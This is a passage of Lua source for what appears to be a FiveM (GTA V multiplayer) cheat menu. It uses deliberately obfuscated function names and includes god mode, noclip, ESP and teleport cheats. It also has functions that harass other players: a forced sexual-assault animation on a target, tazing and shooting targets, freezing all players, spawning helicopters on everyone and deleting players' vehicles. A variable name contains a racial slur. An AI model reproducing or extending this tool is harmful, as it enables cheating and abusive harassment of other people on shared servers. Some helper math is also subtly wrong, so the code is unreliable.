        Citizen.Wait(500)
        blockinput = false
        return resultdlkjghdfgf
    else
        Citizen.Wait(500)
        blockinput = false
        return nil
    end
end

function DelVehuydfstuisdfdsfjnbmgfdkujihgidf(veh)
    SetEntityAsMissionEntity(veh, 1, 1)
    DeleteEntity(veh)
end

function GetInputModeoisdyfhiosddfg()
    return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
end

function TeleportToCoordssduohgoidfgdfgfdgkjhdfkgdfg()
    local x = KeyboardInputdfjhfduhifudihdfg("Enter X Pos", "", 100)
    local y = KeyboardInputdfjhfduhifudihdfg("Enter Y Pos", "", 100)
    local z = KeyboardInputdfjhfduhifudihdfg("Enter Z Pos", "", 100)
    local entity
    if x ~= "" and y ~= "" and z ~= "" then
        if IsPedInAnyVehicle(GetPlayerPed(-1),0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1),0),-1)==GetPlayerPed(-1) then 
            entity = GetVehiclePedIsIn(GetPlayerPed(-1),0)
        else
            entity = PlayerPedId()
        end
        if entity then
            SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1,0,0,1)
        end
    else
        drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~g~Invalid Coords!")
    end
end

function TeleportToWaypointdfjkhglfdhgfdfkgjidfhgdfg()
    if DoesBlipExist(GetFirstBlipInfoId(8)) then
        local blipIterator = GetBlipInfoIdIterator(8)
        local blip = GetFirstBlipInfoId(8, blipIterator)
        WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) --Thanks To Briglair [forum.FiveM.net]
        wp = true
    
    

        local zHeigt = 0.0
        height = 1000.0
        while true do
            Citizen.Wait(0)
            if wp then
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                        (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
                then
                    entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
                else
                    entity = GetPlayerPed(-1)
                end

                SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
                FreezeEntityPosition(entity, true)
                local Pos = GetEntityCoords(entity, true)

                if zHeigt == 0.0 then
                    height = height - 25.0
                    SetEntityCoords(entity, Pos.x, Pos.y, height)
                    bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
                else
                    SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
                    FreezeEntityPosition(entity, false)
                    wp = false
                    height = 1000.0
                    zHeigt = 0.0
                    drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~g~Teleported to waypoint!")
                    break
                end
            end
        end
    else
        drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~r~No waypoint!")
    end
end

    local function runOnAlllkdijuhsgfioudsgdsgsiouygpdfgfdg(func, ...)
        local players = GetActivePlayers()
        for i = 1, #players do
            pcall(func, players[i], ...)
        end
    end
    
    function rapeisjdugifdgfdgidfuhgdfg(player) 
            RequestModel("mp_m_freemode_01") 
            RequestAnimDict("rcmpaparazzo_2") 
            while not HasAnimDictLoaded("rcmpaparazzo_2") do 
                Citizen.Wait(0) 
            end
            
            if IsPedInAnyVehicle(GetPlayerPed(player), true) then 
                local veh = GetVehiclePedIsIn(GetPlayerPed(player), true) 
                
                while not NetworkHasControlOfEntity(veh) do 
                    NetworkRequestControlOfEntity(veh) Citizen.Wait(0) 
                end
                
                SetEntityAsMissionEntity(veh, true, true) 
                DeleteVehicle(veh) 
                DeleteEntity(veh) 
            end 
            count = -0.2
            for b = 1, 3 do 
                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(player), true)) 
                local bD = CreatePed(4, GetHashKey("mp_m_freemode_01"), x, y, z, 0.0, true, false) 
                SetEntityAsMissionEntity(bD, true, true) 
                AttachEntityToEntity(bD, 
                GetPlayerPed(player), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true) 
                ClearPedTasks(GetPlayerPed(player)) 
                TaskPlayAnim(GetPlayerPed(player), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0) 
                SetPedKeepTask(bD) 
                TaskPlayAnim(bD, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0) 
                SetEntityInvincible(bD, true) count = count - 0.4
            end 
        end
	
function TazeKurwa123786345895734uhidfgdolxsbr7vvtys(player)
    local ped = GetPlayerPed(player)
    local tLoc = GetEntityCoords(ped)
    
    local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
    local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
    
    
    
    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
end

function CounterStrikedskjfhyo8irhyp9tsurbtbr(player)
    local ped = GetPlayerPed(player)
    local tLoc = GetEntityCoords(ped)
    
    local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
    local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
    
    
    for i=0, 10 do
    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_CARBINERIFLE`, PlayerPedId(), true, false, 1.0)
	ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_CARBINERIFLE__MK2`, PlayerPedId(), true, false, 1.0)
	ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_ASSAULTRIFLE`, PlayerPedId(), true, false, 1.0)
	ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_ASSAULTRIFLE_MK2`, PlayerPedId(), true, false, 1.0)
	ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_SMG`, PlayerPedId(), true, false, 1.0)
	ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_MICROSMG`, PlayerPedId(), true, false, 1.0)
	ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_PISTOL`, PlayerPedId(), true, false, 1.0)
	ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_PISTOL_MK2`, PlayerPedId(), true, false, 1.0)
	ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_APPISTOL`, PlayerPedId(), true, false, 1.0)
	ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_COMBATPISTOL`, PlayerPedId(), true, false, 1.0)
	ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_HEAVYPISTOL`, PlayerPedId(), true, false, 1.0)
	end
end

function teleportToNearestVehiclejhdsgfsddfhigkidfughydfgfdjkhgdfkgdfg()
            local playerPed = GetPlayerPed(-1)
            local playerPedPos = GetEntityCoords(playerPed, true)
            local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
            local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
            local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
            local NearestPlanePos = GetEntityCoords(NearestPlane, true)
        drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~y~Wait...")
        Citizen.Wait(1000)
        if (NearestVehicle == 0) and (NearestPlane == 0) then
            drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~r~No Vehicle Found")
        elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
            if IsVehicleSeatFree(NearestPlane, -1) then
                SetPedIntoVehicle(playerPed, NearestPlane, -1)
                SetVehicleAlarm(NearestPlane, false)
                SetVehicleDoorsLocked(NearestPlane, 1)
                SetVehicleNeedsToBeHotwired(NearestPlane, false)
            else
                local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
                ClearPedTasksImmediately(driverPed)
                SetEntityAsMissionEntity(driverPed, 1, 1)
                DeleteEntity(driverPed)
                SetPedIntoVehicle(playerPed, NearestPlane, -1)
                SetVehicleAlarm(NearestPlane, false)
                SetVehicleDoorsLocked(NearestPlane, 1)
                SetVehicleNeedsToBeHotwired(NearestPlane, false)
            end
            drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~g~Teleported Into Nearest Vehicle!")
        elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
            if IsVehicleSeatFree(NearestVehicle, -1) then
                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                SetVehicleAlarm(NearestVehicle, false)
                SetVehicleDoorsLocked(NearestVehicle, 1)
                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            else
                local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                ClearPedTasksImmediately(driverPed)
                SetEntityAsMissionEntity(driverPed, 1, 1)
                DeleteEntity(driverPed)
                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                SetVehicleAlarm(NearestVehicle, false)
                SetVehicleDoorsLocked(NearestVehicle, 1)
                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            end
            drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~g~Teleported Into Nearest Vehicle!")
        elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
            if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestVehicle, -1) then
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, false)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
                else
                    local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                    ClearPedTasksImmediately(driverPed)
                    SetEntityAsMissionEntity(driverPed, 1, 1)
                    DeleteEntity(driverPed)
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, false)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
                end
            elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestPlane, -1) then
                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
                    SetVehicleAlarm(NearestPlane, false)
                    SetVehicleDoorsLocked(NearestPlane, 1)
                    SetVehicleNeedsToBeHotwired(NearestPlane, false)
                else
                    local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
                    ClearPedTasksImmediately(driverPed)
                    SetEntityAsMissionEntity(driverPed, 1, 1)
                    DeleteEntity(driverPed)
                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
                    SetVehicleAlarm(NearestPlane, false)
                    SetVehicleDoorsLocked(NearestPlane, 1)
                    SetVehicleNeedsToBeHotwired(NearestPlane, false)
                end
            end
            drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~g~Teleported Into Nearest Vehicle!")
        end

    end

Citizen.CreateThreadNow(function() 
    local headId = {}
    while Enableddsyfusdsdfsdffdkjghdflgf do
        Citizen.Wait(1)
        if playerBlipsjhgdsfsdhgfukidsfdsf then
            -- show blips
            for id = 0, 64 do
                if NetworkIsPlayerActive(id) and GetPlayerPed(id) ~= GetPlayerPed(-1) then
                    ped = GetPlayerPed(id)
                    blip = GetBlipFromEntity(ped)

                    -- HEAD rturtyue5tjtdfndt STUFF --

                    -- Create head rturtyue5tjtdfndt (this is safe to be spammed)
                    headId[id] = CreateMpGamerTag(ped, GetPlayerName( id ), false, false, "", false)
                    wantedLvl = GetPlayerWantedLevel(id)

                    -- Wanted level rturtyue5tjtdfndt
                    if wantedLvl then
                        SetMpGamerTagVisibility(headId[id], 7, true) -- adddhifgiodugfdg wanted sprite
                        SetMpGamerTagWantedLevel(headId[id], wantedLvl) -- Set wanted number
                    else
                        SetMpGamerTagVisibility(headId[id], 7, false)
                    end

                    -- Speaking rturtyue5tjtdfndt
                    if NetworkIsPlayerTalking(id) then
                        SetMpGamerTagVisibility(headId[id], 9, true) -- adddhifgiodugfdg speaking sprite
                    else
                        SetMpGamerTagVisibility(headId[id], 9, false) -- Remove speaking sprite
                    end

                    -- BLIP STUFF --

                    if not DoesBlipExist(blip) then -- adddhifgiodugfdg blip and create head rturtyue5tjtdfndt on player
                        blip = AddBlipForEntity(ped)
                        SetBlipSprite(blip, 1)
                        ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
                    else -- update blip
                        veh = GetVehiclePedIsIn(ped, false)
                        blipSprite = GetBlipSprite(blip)
                        if not GetEntityHealth(ped) then -- dead
                            if blipSprite ~= 274 then
                                SetBlipSprite(blip, 274)
                                ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                            end
                        elseif veh then
                            vehClass = GetVehicleClass(veh)
                            vehModel = GetEntityModel(veh)
                            if vehClass == 15 then -- Helicopters
                                if blipSprite ~= 422 then
                                    SetBlipSprite(blip, 422)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehClass == 8 then -- Motorcycles
                                if blipSprite ~= 226 then
                                    SetBlipSprite(blip, 226)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehClass == 16 then -- Plane
                                if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then -- Jets
                                    if blipSprite ~= 424 then
                                        SetBlipSprite(blip, 424)
                                        ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                    end
                                elseif blipSprite ~= 423 then
                                    SetBlipSprite(blip, 423)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehClass == 14 then -- Boat
                                if blipSprite ~= 427 then
                                    SetBlipSprite(blip, 427)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("insurgent3") then -- Insurgent, Insurgent Pickup & Insurgent Pickup Custom
                                if blipSprite ~= 426 then
                                    SetBlipSprite(blip, 426)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("limo2") then -- Turreted Limo
                                if blipSprite ~= 460 then
                                    SetBlipSprite(blip, 460)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("rhino") then -- Tank
                                if blipSprite ~= 421 then
                                    SetBlipSprite(blip, 421)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("trash") or vehModel == GetHashKey("trash2") then -- Trash
                                if blipSprite ~= 318 then
                                    SetBlipSprite(blip, 318)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("pbus") then -- Prison Bus
                                if blipSprite ~= 513 then
                                    SetBlipSprite(blip, 513)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("seashark") or vehModel == GetHashKey("seashark2") or vehModel == GetHashKey("seashark3") then -- Speedophiles
                                if blipSprite ~= 471 then
                                    SetBlipSprite(blip, 471)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("cargobob") or vehModel == GetHashKey("cargobob2") or vehModel == GetHashKey("cargobob3") or vehModel == GetHashKey("cargobob4") then -- Cargobobs
                                if blipSprite ~= 481 then
                                    SetBlipSprite(blip, 481)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("technical") or vehModel == GetHashKey("technical2") or vehModel == GetHashKey("technical3") then -- Technical
                                if blipSprite ~= 426 then
                                    SetBlipSprite(blip, 426)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("taxi") then -- Cab/ Taxi
                                if blipSprite ~= 198 then
                                    SetBlipSprite(blip, 198)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("fbi") or vehModel == GetHashKey("fbi2") or vehModel == GetHashKey("police2") or vehModel == GetHashKey("police3") -- Police vehiclesiusdyfousidf
                                or vehModel == GetHashKey("police") or vehModel == GetHashKey("sheriff2") or vehModel == GetHashKey("sheriff")
                                or vehModel == GetHashKey("policeold2") or vehModel == GetHashKey("policeold1") then
                                if blipSprite ~= 56 then
                                    SetBlipSprite(blip, 56)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif blipSprite ~= 1 then -- default blip
                                SetBlipSprite(blip, 1)
                                ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
                            end

                            -- Show number in case of haslokurwa78346ygfrsfsdangers
                            haslokurwa78346ygfrsfsdengers = GetVehicleNumberOfEnabled(veh)

                            if haslokurwa78346ygfrsfsdengers then
                                if not IsVehicleSeatFree(veh, -1) then
                                    haslokurwa78346ygfrsfsdengers = haslokurwa78346ygfrsfsdengers + 1
                                end
                                ShowNumberOnBlip(blip, haslokurwa78346ygfrsfsdengers)
                            else
                                HideNumberOnBlip(blip)
                            end
                        else
                            -- Remove leftover number
                            HideNumberOnBlip(blip)
                            if blipSprite ~= 1 then -- default blip
                                SetBlipSprite(blip, 1)
                                ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
                            end
                        end
                        
                        SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) -- update rotation
                        SetBlipNameToPlayerName(blip, id) -- update blip name
                        SetBlipScale(blip,  0.85) -- set scale

                        -- set player alpha
                        if IsPauseMenuActive() then
                            SetBlipAlpha( blip, 255 )
                        else
                            x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                            x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
                            distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
                            -- Probably a way easier way to do this but whatever im an idiot

                            if distance < 0 then
                                distance = 0
                            elseif distance > 255 then
                                distance = 255
                            end
                            SetBlipAlpha(blip, distance)
                        end
                    end
                end
            end
        else
            for id = 0, 64 do
                ped = GetPlayerPed(id)
                blip = GetBlipFromEntity(ped)
                if DoesBlipExist(blip) then -- Removes blip
                    RemoveBlip(blip)
                end
                if IsMpGamerTagActive(headId[id]) then
                    RemoveMpGamerTag(headId[id])
                end
            end
        end
    end
end)

function ShootPlayerhgufiydsfdsfdsdfdfiughdflogdfg(player)
    local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
end


function KurwaPropNaTypadfuihgydsioufdsfdsf(modelHash)
    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)					
    local objfdgjhkfdg CreateObject(modelHash, coords.x, coords.y, coords.z, true, true, true)
        if attachProp then
            AttachEntityToEntity(objfdgjhkfdg ,GetPlayerPed(SelectedPlayeriufdhiguodlfgd), GetPedBoneIndex(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true ,true ,false, true, 1, true)
        end
end

function rotDirectiondfjkgihdfilougdfg(rot)
    local radianz = rot.z * 0.0174532924
    local radianx = rot.x * 0.0174532924
    local num = math.abs(math.cos(radianx))

    local dir = vector3(-math.sin(radianz) * num, math.cos(radianz) * num, math.sin(radianx))

    return dir
end
                        
function GetDistanceskjghfdlkiugdfg(pointA, pointB)
    
    local aX = pointA.x
    local aY = pointA.y
    local aZ = pointA.z 

    local bX = pointB.x
    local bY = pointB.y
    local bZ = pointB.z 

    local xBA = bX - aX
    local yBA = bY - aY
    local zBA = bZ - aZ

    local y2 = yBA * yBA
    local x2 =  xBA * xBA
    local sum2 = y2 + x2	

    return math.sqrt(sum2 + zBA)
end

function RotToDirectionusyigifdgu8dfg(rot)
    local radiansZ = rot.z * 0.0174532924
    local radiansX = rot.x * 0.0174532924
    local num = math.abs(math.cos(radiansX))
    local dir = vector3(-math.sin(radiansZ) * num, math.cos(radiansZ * num), math.sin(radiansX))
    return dir
end

function adddhifgiodugfdg(a, b)
    local resultdlkjghdfgf = vector3(a.x + b.x, a.y + b.y, a.z + b.z)

    return resultdlkjghdfgf
end

function multiplyygsudiyfghgdg(coords, coordz)
    local resultdlkjghdfgf = vector3(coords.x * coordz, coords.y * coordz, coords.z * coordz)

    return resultdlkjghdfgf
end

function SpectatePlayerjkdhfglkidfgdf(player)
    local playerPed = PlayerPedId()
    Spectating = not Spectating
    local targetPed = GetPlayerPed(player)

    if (Spectating) then
        local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(true, targetPed)

        drawNotificationuisdyfosdgfgdfjghdfjkgdfg("Spectating " .. GetPlayerName(player))
    else
        local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(false, targetPed)

        drawNotificationuisdyfosdgfgdfjghdfjkgdfg("Stopped Spectating " .. GetPlayerName(player))
    end
end

Citizen.CreateThreadNow(
    function()
        while true do
            Citizen.Wait(0)
            
            DisplayRadar(true)

            SetPlayerWantedLevel(PlayerId(), 0, false)

            SetPlayerWeaponDamageModifier(PlayerId(), selectedDamagediusygtiodfgdfkjhgdkofgfg)
            SetPlayerMeleeWeaponDamageModifier(PlayerId(), selectedDamagediusygtiodfgdfkjhgdkofgfg)

            SetPlayerInvincible(PlayerId(), GodModedfkjghdfkgdfg)
            SetEntityInvincible(PlayerPedId(), GodModedfkjghdfkgdfg)

            if infStaminafdkjlhgldifgdfg then
                RestorePlayerStamina(PlayerId(), 1.0)
            end

            if freezePlayerjhfdgsfudgfdfgdoihjfglihg then 
                ClearPedTasksImmediately(GetPlayerPed(SelectedPlayeriufdhiguodlfgd))
            end

            if crosshairkdjshfksdfsdf then 
                ShowHudComponentThisFrame(14)
            end

            if crosshairkdjshfksdfsdf2 then
                chiuiufdsfiuhfdfdhuidfgu("~r~+",0.495,0.484)
            end

            if crosshairkdjshfksdfsdf3 then
                chiuiufdsfiuhfdfdhuidfgu("~r~.",0.4968,0.478)
            end

            local niggerVehicledjksihgoidfgfdgfkdiuhgykidfg = GetVehiclePedIsIn(PlayerPedId(), false)
            
            if fallfkdouhgolidfgf then
                for i = 0, 128 do
                    ClearPedTasksImmediately(GetPlayerPed(i))
                end
            end

            if sallgysudifgusidfsdf then
                for i = 0, 128 do
                    local ped = GetPlayerPed(i)
                    local coords = GetEntityCoords(ped)
                    local vehiclehash = GetHashKey("savage")
                    RequestModel(vehiclehash)
                    CreateVehicle(vehiclehash, coords.x, coords.y, coords.z, GetEntityHeading(ped), 1, 0)
                end
            end
            

            if Noclipfuighfdloiugfdg then
                local currentSpeed = 2
                local noclipEntity =
                    IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
                FreezeEntityPosition(PlayerPedId(), true)
                SetEntityInvincible(PlayerPedId(), true)

                local newPos = GetEntityCoords(entity)

                DisableControlAction(0, 32, fa) --MoveUpOnly
                DisableControlAction(0, 268, true) --MoveUp

                DisableControlAction(0, 31, true) --MoveUpDown

                DisableControlAction(0, 269, true) --MoveDown
                DisableControlAction(0, 33, true) --MoveDownOnly

                DisableControlAction(0, 266, true) --MoveLeft
                DisableControlAction(0, 34, true) --MoveLeftOnly

                DisableControlAction(0, 30, true) --MoveLeftRight

                DisableControlAction(0, 267, true) --MoveRight
                DisableControlAction(0, 35, true) --MoveRightOnly

                DisableControlAction(0, 44, true) --Cover
                DisableControlAction(0, 20, true) --MultiplayerInfo

                local yoff = 0.0
                local zoff = 0.0

                if GetInputModeoisdyfhiosddfg() == "MouseAndKeyboard" then
                    if IsDisabledControlPressed(0, 32) then
                        yoff = 0.5
                    end
                    if IsDisabledControlPressed(0, 33) then
                        yoff = -0.5
                    end
                    if IsDisabledControlPressed(0, 34) then
                        SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) + 3.0)
                    end
                    if IsDisabledControlPressed(0, 35) then
                        SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) - 3.0)
                    end
                    if IsDisabledControlPressed(0, 44) then
                        zoff = 0.21
                    end
                    if IsDisabledControlPressed(0, 20) then
                        zoff = -0.21
                    end
                end

                newPos =
                    GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))

                local heading = GetEntityHeading(noclipEntity)
                SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
                SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, false)
                SetEntityHeading(noclipEntity, heading)

                SetEntityCollision(noclipEntity, false, false)
                SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, true, true, true)

                FreezeEntityPosition(noclipEntity, false)
                SetEntityInvincible(noclipEntity, false)
                SetEntityCollision(noclipEntity, true, true)
            end	

            if DeleteGuniuhiouhfdgfdgfdlgpijkdpfgfg then
                local gotEntity = getEntitysjudifhyisdfdsf(PlayerId())
                if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
                    drawNotificationuisdyfosdgfgdfjghdfjkgdfg("Aim The Gun At An Entity And Shoot!")
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
                    if (GetselectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
                        if IsPlayerFreeAiming(PlayerId()) then
                            if IsEntityAPed(gotEntity) then
                                if IsPedInAnyVehicle(gotEntity, true) then
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
                                        DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
                                        SetEntityAsMissionEntity(gotEntity, 1, 1)
                                        DeleteEntity(gotEntity)
                                        drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~g~Deleted!")
                                    end
                                else
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(gotEntity, 1, 1)
                                        DeleteEntity(gotEntity)
                                        drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~g~Deleted!")
                                    end
                                end
                            else
                                if IsControlJustReleased(1, 142) then
                                    SetEntityAsMissionEntity(gotEntity, 1, 1)
                                    DeleteEntity(gotEntity)
                                    drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~g~Deleted!")
                                end
                            end
                        end
                    end
                end
            end

            if espgfduygudygdfgjhfdbhgjdfg then
                for i = 0, 64 do
                    if i ~= PlayerId() and GetPlayerServerId(i) ~= 0 then
                        local ra = RGBRainbowhugbdsfklkhuisd(1.0)
                        local pPed = GetPlayerPed(i)
                        local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
                        local x, y, z = table.unpack(GetEntityCoords(pPed))
                        local message =
                            "~h~Name: " ..
                            GetPlayerName(i) ..
                                "\nServer ID: " ..
                                    GetPlayerServerId(i) ..
                                        "\nPlayer ID: " .. i .. "\nDist: " .. math.rounduydsgfsdf(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, true), 1)
                        if IsPedInAnyVehicle(pPed, true) then
                            local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
                            message = message .. "\nVeh: " .. VehName
                        end
                        drawTextdsifhgsdfsdf3D(x, y, z + 1.0, message, ra.r, ra.g, ra.b)

                        LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                        LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                        LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                        LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                        LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                        LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                        LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

                        TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                        TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                        TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                        TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                        TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                        TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                        TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

                        ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
